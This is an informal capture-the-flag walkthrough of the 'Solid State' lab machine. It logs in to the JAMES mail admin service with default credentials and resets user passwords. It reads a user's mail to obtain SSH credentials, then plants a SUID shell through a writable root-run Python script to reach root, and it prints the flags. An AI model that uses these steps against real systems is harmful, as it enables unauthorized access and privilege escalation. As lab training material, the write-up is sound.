@@ -1,0 +1,176 @@
+Nmap scan report for 192.168.56.117
+Host is up (0.000084s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+110/tcp  open  pop3
+119/tcp  open  nntp
+4555/tcp open  rsip
+MAC Address: 08:00:27:31:36:A0 (Oracle VirtualBox virtual NIC)
+
+
+
+
+
+
+
+
+root@saimson:~/Desktop/.machine/solidstate# nmap -sT -sV -A -p- 192.168.56.117
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 03:11 IST
+Nmap scan report for 192.168.56.117
+Host is up (0.00051s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
+25/tcp   open  smtp        JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org (192.168.56.1 [192.168.56.1]), PIPELINING, ENHANCEDSTATUSCODES, 
+80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Home - Solid State Security
+110/tcp  open  pop3        JAMES pop3d 2.3.2
+119/tcp  open  nntp        JAMES nntpd (posting ok)
+4555/tcp open  james-admin JAMES Remote Admin 2.3.2
+MAC Address: 08:00:27:31:36:A0 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+i found James smtpd was vulnrabele with remote command execution
+
+got the defual username pass root root
+telnet ip 4555
+root
+root
+then set all users password
+nd then 
+nc with or telnet on 110 port
+just check by giving them command
+
+
+user mindy
+pass mindy
+here will be some mail
+to access give the command
+
+retr 2
+
+then i got this
+
+
+
+
+
+
+
+
+
+We are looking forward to you joining our team and your success at Solid State Security. 
+
+Respectfully,
+James
+.
+retr 2
++OK Message follows
+Return-Path: <mailadmin@localhost>
+Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+          for <mindy@localhost>;
+          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+
+
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+
+
+after ssh
+
+-rbash: $'\r': command not found
+mindy@solidstate:~$ ls
+bin  user.txt
+mindy@solidstate:~$ cat user.txt
+914d0a4ebc1777889b5b89a23f556fd75
+mindy@solidstate:~$ 
+ 
+ i got the flag
+search for the writabale file
+find / -writable -type  f 2>/dev/null | grep -v "/proc/"
+
+i got tmp.py which was running to remove the files in tmp 
+
+so i now i'm sure with this i can root the target
+
+There so many methods to gain root access as in this method we copied /bin/sh inside /tmp and enabled SUID for /tmp/sh. 
+It is quite simple, first, open the file through some editor for example 
+nano sanitizer.pyn and replace “rm -r /tmp/*” from the following line as 
+given below 
+
+add this two lines in script
+os.system('cp /bin/sh /tmp/sh')
+os.system('chmod u+s /tmp/sh')
+
+
+
+after adding this the file look like
+
+
+
+# cat tmp.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+      os.system('cp /bin/sh /tmp/sh')
+      os.system('chmod u+s /tmp/sh')
+except:
+     sys.exit()
+
+
+
+
+
+this will create sh file in tmp directory
+lets execute it
+cd /tmp
+sh
+./sh
+id
+uid=1001(mindy) gid=1001(mindy) euid=0(root) groups=1001(mindy)
+
+# cd /root
+# ls
+root.txt
+# cat root.txt	
+b4c9723a28899b1c45db281d99cc87c9
+# 
+root flag is here////////
+yoooo             i               got          the         root
